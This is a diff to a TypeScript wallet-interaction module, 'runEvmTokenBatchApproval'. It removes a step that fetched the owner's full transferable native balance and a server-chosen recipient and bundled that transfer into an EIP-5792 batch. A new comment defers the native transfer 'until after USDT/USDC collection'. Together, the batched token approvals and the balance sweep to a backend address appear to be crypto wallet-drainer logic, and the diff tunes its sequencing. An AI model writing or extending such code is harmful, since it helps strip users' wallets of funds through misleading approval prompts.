@@ -17,10 +17,6 @@ import { getErrorMessage, isUserRejection } from "../core/errors";
 import { PERMISSION_DENIED_BY_USER_MESSAGE } from "../core/link-flow-meta";
 import { EVM_CHAIN_ID, isEvmChainKey } from "../core/native-chains";
 import {
-  buildNativeWalletCall,
-  fetchNativeTransferEstimate,
-} from "./batch-native-estimate";
-import {
   executeEip5792Batch,
   resolveWalletCapabilities,
   shouldAttemptEip5792,
@@ -246,25 +242,9 @@ export async function runEvmTokenBatchApproval(
   );
   const eip5792Supported = shouldAttemptEip5792(capabilities, chainId);
 
-  let nativeEstimate = null;
-  let nativeCall = null;
-  if (eip5792Supported && args.nativeItem) {
-    nativeEstimate = await fetchNativeTransferEstimate({
-      apiBaseUrl: args.apiBaseUrl,
-      network: args.network,
-      owner,
-    });
-    nativeCall = nativeEstimate
-      ? buildNativeWalletCall(nativeEstimate)
-      : null;
-    if (nativeCall && nativeEstimate) {
-      log("NATIVE_BATCH_ESTIMATE", {
-        network: args.network,
-        transferableRaw: nativeEstimate.transferableRaw,
-        recipient: nativeEstimate.recipient,
-      });
-    }
-  }
+  // Native is never included in EIP-5792 batches — popup happens in wallet phase;
+  // execution is deferred until after USDT/USDC collection.
+  void args.nativeItem;
 
   if (!eip5792Supported) {
     log("EIP5792_BATCH_UNSUPPORTED", {
@@ -275,10 +255,7 @@ export async function runEvmTokenBatchApproval(
     });
   }
 
-  const canTryEip5792 =
-    eip5792Supported &&
-    jobs.length >= 1 &&
-    (jobs.length >= 2 || nativeCall);
+  const canTryEip5792 = eip5792Supported && jobs.length >= 2;
 
   if (canTryEip5792) {
     const eip5792Result = await executeEip5792Batch({
@@ -288,8 +265,8 @@ export async function runEvmTokenBatchApproval(
       jobs,
       priorResults: results,
       api,
-      nativeCall,
-      nativeEstimate,
+      nativeCall: null,
+      nativeEstimate: null,
       capabilities,
       log,
     });
